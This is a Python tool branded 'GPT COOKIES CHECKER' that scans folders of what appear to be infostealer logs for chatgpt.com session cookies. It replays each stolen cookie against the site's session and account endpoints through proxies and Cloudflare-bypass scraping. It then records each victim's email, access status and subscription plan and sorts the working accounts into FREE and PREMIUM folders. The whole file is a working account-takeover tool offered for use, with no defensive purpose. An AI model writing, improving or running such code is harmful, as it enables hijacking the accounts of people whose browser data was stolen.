import requests
from datetime import datetime
import urllib3
import cloudscraper
import ctypes
import easygui
import time
import threading
import webbrowser
import random
import sys
from conn import conn
import time
from concurrent.futures import ThreadPoolExecutor
import colorama
import os
import re
colorama.init()
if os.path.exists(os.path.join(os.getcwd(),"Result")):
    pass
else:
    os.mkdir("Result")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class AI:
    def ui(self):
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'GPT COOKIES CHECKER  - MADE BY @BINARY_THUG') 
        text = '''    
 ██████╗ ██████╗ ████████╗    ███████╗██╗   ██╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔════╝ ██╔══██╗╚══██╔══╝    ██╔════╝██║   ██║██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║  ███╗██████╔╝   ██║       █████╗  ██║   ██║██║     █████╔╝ █████╗  ██████╔╝
██║   ██║██╔═══╝    ██║       ██╔══╝  ██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚██████╔╝██║        ██║       ██║     ╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║
 ╚═════╝ ╚═╝        ╚═╝       ╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                                                                                                                      
*************************                                                                                                                              
BY @BINARY_THUG 
*************************                                                                                                                                                                
'''        
        faded = ''
        red = 20
        for line in text.splitlines():
            faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(self.center(faded))
    def Path(self, path):
        paths = []
        for root, dirs, files in os.walk(path):
            for dir in dirs:
                if dir in {'cookies', 'COOKIES', 'Cookie', 'Cookies', 'COOKIE'}:
                    paths.append(os.path.join(root, dir))
        return set(paths)
    def print_horizontal_line(self,character='='):
        terminal_width = os.get_terminal_size().columns
        print(colorama.Fore.CYAN+character * terminal_width+colorama.Fore.RESET)
    def print_stats(self, lin):
        while True:
            if self.glob_tr==False:
                break
            else:
                ctypes.windll.kernel32.SetConsoleTitleW(f"[GPT COOKIE CHECKER]--BY @BINARY_THUG|VALIDS:{self.valid}|INVALIDS:{self.invalid}|TOTAL LOGS FOLDER:{len(lin)}|")
    def __init__(self):
        self.invalid=0
        self.valid=0
        self.glob_tr=True
    def center(self, var: str, space: int = None):  # From Pycenter
        if not space:
            space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())
    def runner(self,logs_path,workers,datetime,prox):
        print(colorama.Fore.CYAN+"LOADING MODULE")
        path_list=self.Path(path=logs_path)
        with ThreadPoolExecutor(max_workers=workers) as executor:
            for pat in path_list:
                try:
                    executor.submit(self.test,pat,datetime,prox)
                except:
                    continue 
            t=threading.Thread(target=self.print_stats,args=(path_list,))
            t.daemon=True
            t.start()
            os.system("cls")
            self.ui()
            executor.shutdown(wait=True)
            self.glob_tr=False
    def net_to_cookie(self, filename, service):
        cookies = {}
        NF_line = []
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as fp:
                for line in fp:
                    try:
                        if not re.match('^\\#', line):
                            if service in line:
                                lineFields = line.strip().split('\t')
                                cookies[lineFields[5]] = lineFields[6]
                                NF_line.append(line)
                    except Exception:
                        continue
        except UnicodeDecodeError:
            with open(filename, 'r') as fp:
                for line in fp:
                    try:
                        if not re.match('^\\#', line):
                            if service in line:
                                lineFields = line.strip().split('\t')
                                cookies[lineFields[5]] = lineFields[6]
                                NF_line.append(line)
                    except Exception:
                        continue

        return cookies, NF_line
    def random_prox(self,filename):
        lun=open(filename,errors='ignore',encoding='utf-8').readlines()
        li=str(random.choice(lun)).replace("\n","")
        many=li.split(":")
        if len(many)==4:
            real_prox=f"{many[2]}:{many[3]}@{many[0]}:{many[1]}"
            return real_prox
        elif len(many)==2:
            return li    
    def test(self,path,datetime,filename):
        for root,dirs, files in os.walk(path):
            for fil in files:
                if str(fil).endswith(".txt"):
                    full_path = os.path.join(root, fil)
                    cookiet, CR_LINES = self.net_to_cookie(full_path, ".chatgpt.com")
                    if '__Secure-next-auth.session-token' in cookiet: 
                        pass              
                    else:
                        self.invalid=self.invalid+1
                        print(colorama.Fore.RED+"[!] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
                        continue
                    if not cookiet:
                        self.invalid=self.invalid+1
                        continue
                    else:
                        headers = {
    "Host": "chatgpt.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Connection": "keep-alive",
    "Content-length":"0",
    "Cookie": "; ".join([f"{name}={value}" for name, value in cookiet.items()])
}
                        scrapper=cloudscraper.create_scraper()
                        res=conn((scrapper.get),"https://chatgpt.com/api/auth/session",headers=headers,filesname=filename)
                        try:
                            acesstoken=res.json()["accessToken"]
                            email=res.json()["user"]["email"]
                        except:
                            print(colorama.Fore.RED+"[!] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
                            self.invalid=self.invalid+1
                            continue
                        mheaders = {
    "Host": "chatgpt.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Referer": "https://chatgpt.com/",
    "OAI-Language": "en-US",
    "OAI-Device-Id": "ddb2e9d4-a170-4d0b-b4b1-aa3806549cb4",
    "Authorization": f"Bearer {acesstoken}",
    "DNT": "1",
    "Sec-GPC": "1",
    "Connection": "keep-alive",
    "Cookie": "; ".join([f"{name}={value}" for name, value in cookiet.items()])
} 
                        ut="https://chatgpt.com/backend-api/accounts/check/v4-2023-04-27?timezone_offset_min=420"
                        ter=conn((scrapper.get),ut,headers=mheaders,filesname=filename,cookies=cookiet)
                        ser=re.search(r'"subscription_plan":\s*"([^"]+)"',ter.text)
                        if ser:
                            self.valid=self.valid+1
                            print(colorama.Fore.GREEN+"[*] VALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
                            subscription_plan = ser.group(1)
                            if subscription_plan=="chatgptfreeplan":
                                var=f"[{email}][{subscription_plan}].txt"
                                tat=os.path.join(datetime,"FREE",var)
                                with open(tat,"w",errors='ignore',encoding='utf-8') as we:
                                    for l in CR_LINES:
                                        we.write(l)
                                    we.write(f"\n❯❯❯OPENAI FREE COOKIE ACCOUNT❮❮❮\n----------------------------------------------------\n➤EMAIL: {email}\n➤PLAN: {subscription_plan}\n\n----------------------------------------------------\n➤  ACCOUNT BY [ @BINARY_THUG ]")
                            else:
                                vari=f"[{email}][{subscription_plan}].txt"
                                tarr=os.path.join(datetime,"PREMIUM",vari)
                                with open(tarr,"w",errors='ignore',encoding='utf-8') as wie:
                                    for li in CR_LINES:
                                        wie.write(li)
                                    wie.write(f"\n❯❯❯OPENAI PREMIUM COOKIE ACCOUNT❮❮❮\n----------------------------------------------------\n➤EMAIL: {email}\n➤PLAN: {subscription_plan}\n\n----------------------------------------------------\n➤  ACCOUNT BY [ @BINARY_THUG ]")
                        else:
                            self.invalid=self.invalid+1
                            subscription_plan='EXPIRED'
                            varo=f"[{email}][{subscription_plan}].txt"
                            tati=os.path.join(datetime,"EXPIRED",varo)
                            with open(tati,"w",errors='ignore',encoding='utf-8') as wia:
                                    for li in CR_LINES:
                                        wia.write(li)
                                    wia.write(f"\n❯❯❯OPENAI EXPIRED COOKIE ACCOUNT❮❮❮\n----------------------------------------------------\n➤EMAIL: {email}\n➤PLAN: {subscription_plan}\n\n----------------------------------------------------\n➤  ACCOUNT BY [ @BINARY_THUG ]")
                            
                                
                            
def maximize_console_window():
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 3)            
def datetimefolder(path):
    current_datetime = datetime.now().strftime("%m-%d-%y_%H-%M-%S")
    shia = os.path.join(path, current_datetime)
    os.mkdir(shia)
    os.mkdir(os.path.join(shia,"FREE"))
    os.mkdir(os.path.join(shia,"PREMIUM"))
    os.mkdir(os.path.join(shia,"EXPIRED"))
    return shia     
def main():
    colorama.init()
    os.system("cls")
    print(colorama.Fore.CYAN+"Wait Loading Model")
    maximize_console_window()
    
    os.system("cls")
    NF=AI()
    NF.ui()
    print(f"""
          
          [{colorama.Fore.CYAN}Main Menu{colorama.Fore.RESET}]

    [{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit
    
    """)
    type=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
    if type=="1":
        os.system("cls")
        current = os.path.join(os.getcwd(), "Result")
        logs_pathi=easygui.diropenbox(title="GPT COOKIE CHECKER- SELECT LOGS FOLDER")
        thread_num=input(colorama.Fore.RED+"[*]"+colorama.Fore.RESET+"ENTER THE THREADS:")
        while int(thread_num)>40:
            os.system("cls")
            print(colorama.Fore.GREEN+"[WARNING]"+colorama.Fore.YELLOW+"Only 40 threads are allowed"+colorama.Fore.RESET)
            thread_num=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER THE THREADS:")
        os.system("cls")
        p=easygui.fileopenbox(title="NFCOOKIE CHECKER- SELECT PROXY FILE",filetypes=["*.txt"],multiple=False)
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"THREADS LOADED ")
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"PATH LOADED ")
        up=os.path.join(os.getcwd(),"Result")
        rea=datetimefolder(up)
        NF.runner(logs_pathi,workers=int(thread_num),datetime=rea,prox=p)
        os.system("cls")
        NF.ui()
        NF.print_horizontal_line()
        print(NF.center(colorama.Fore.CYAN+"CHECKER BY @BINARY_THUG"))
        print(NF.center(colorama.Fore.GREEN+"CHECKER ENDED............"))
        print(NF.center(colorama.Fore.CYAN+"ENJOY YOUR GPT COOKIES"+colorama.Fore.RESET))
        NF.print_horizontal_line()
        ctypes.windll.kernel32.SetConsoleTitleW(f"[GPT COOKIE CHECKER]--BY @BINARY_THUG |VALIDS:{NF.valid}|INVALIDS:{NF.invalid}|")
        print(f"""

    [{colorama.Fore.RESET}{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit""")
        t=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
        if t=="1":
            os.system("cls")
            main()
        elif t==2:
            os.system("cls")
            sys.exit()
        else:
            os.system("cls")
            sys.exit()
    elif type=="2":
        os.system("cls")
        sys.exit()
    else:
        os.system("cls")
        sys.exit()
main()